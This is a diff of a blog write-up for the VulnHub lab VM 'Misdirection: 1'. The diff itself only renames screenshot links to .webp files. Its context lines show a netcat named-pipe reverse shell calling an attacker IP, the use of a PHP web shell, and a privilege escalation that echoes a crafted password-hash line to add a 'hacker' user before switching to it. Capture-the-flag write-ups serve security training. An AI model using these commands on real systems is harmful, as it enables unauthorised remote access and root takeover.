@@ -7,7 +7,7 @@ tags: vulnhub, writeup
 ## Overview
 This is a writeup for VulnHub VM [Misdirection: 1](https://www.vulnhub.com/entry/misdirection-1,371/). Here's an overview of the `enumeration` → `exploitation` → `privilege escalation` process:
 
-![writeup.overview.killchain](/static/files/posts_vulnhub_misdirection1/killchain.png)
+![writeup.overview.killchain](/static/files/posts_vulnhub_misdirection1/killchain.png.webp)
 
 ## Phase #1: Enumeration
 1\. Here's the Nmap scan result:  
@@ -56,7 +56,7 @@ http://192.168.92.187:8080/wordpress (Status: 301)
 
 3\. Upon checking out the `/debug` url, we find that it has a PHP web shell called [p0wny-shell](https://github.com/flozz/p0wny-shell). This is a huge convenience as we can now spawn a reverse shell and get fully interactive access:  
 
-![writeup.enumeration.steps.3.1](/static/files/posts_vulnhub_misdirection1/screenshot00.png)  
+![writeup.enumeration.steps.3.1](/static/files/posts_vulnhub_misdirection1/screenshot00.png.webp)  
 
 ### Findings
 #### Open Ports
@@ -82,9 +82,9 @@ nc -nlvp 443
 rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.92.183 443 >/tmp/f
 ```
 
-![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_misdirection1/screenshot01.png)  
+![writeup.exploitation.steps.1.1](/static/files/posts_vulnhub_misdirection1/screenshot01.png.webp)  
 
-![writeup.exploitation.steps.1.2](/static/files/posts_vulnhub_misdirection1/screenshot02.png)  
+![writeup.exploitation.steps.1.2](/static/files/posts_vulnhub_misdirection1/screenshot02.png.webp)  
 
 ## Phase #2.5: Post Exploitation
 ```
@@ -124,26 +124,26 @@ echo -e "hacker:\$6\$saltsalt\$qFmFH.bQmmtXzyBY0s9v7Oicd2z4XSIecDzlB5KiA2/jctKu9
 su hacker
 ```
 
-![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_misdirection1/screenshot03.png)  
+![writeup.privesc.steps.1.1](/static/files/posts_vulnhub_misdirection1/screenshot03.png.webp)  
 
-![writeup.privesc.steps.1.2](/static/files/posts_vulnhub_misdirection1/screenshot04.png)  
+![writeup.privesc.steps.1.2](/static/files/posts_vulnhub_misdirection1/screenshot04.png.webp)  
 
-![writeup.privesc.steps.1.3](/static/files/posts_vulnhub_misdirection1/screenshot05.png)  
+![writeup.privesc.steps.1.3](/static/files/posts_vulnhub_misdirection1/screenshot05.png.webp)  
 
-![writeup.privesc.steps.1.4](/static/files/posts_vulnhub_misdirection1/screenshot06.png)  
+![writeup.privesc.steps.1.4](/static/files/posts_vulnhub_misdirection1/screenshot06.png.webp)  
 
-![writeup.privesc.steps.1.5](/static/files/posts_vulnhub_misdirection1/screenshot07.png)  
+![writeup.privesc.steps.1.5](/static/files/posts_vulnhub_misdirection1/screenshot07.png.webp)  
 
-![writeup.privesc.steps.1.6](/static/files/posts_vulnhub_misdirection1/screenshot08.png)  
+![writeup.privesc.steps.1.6](/static/files/posts_vulnhub_misdirection1/screenshot08.png.webp)  
 
-![writeup.privesc.steps.1.7](/static/files/posts_vulnhub_misdirection1/screenshot09.png)  
+![writeup.privesc.steps.1.7](/static/files/posts_vulnhub_misdirection1/screenshot09.png.webp)  
 
 2\. We can view the file `/root/root.txt` to get the flag and complete the challenge:  
 ```
 cat /root/root.txt
 ```
 
-![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_misdirection1/screenshot10.png)  
+![writeup.privesc.steps.2.1](/static/files/posts_vulnhub_misdirection1/screenshot10.png.webp)  
 
 ## Loot
 ### Hashes
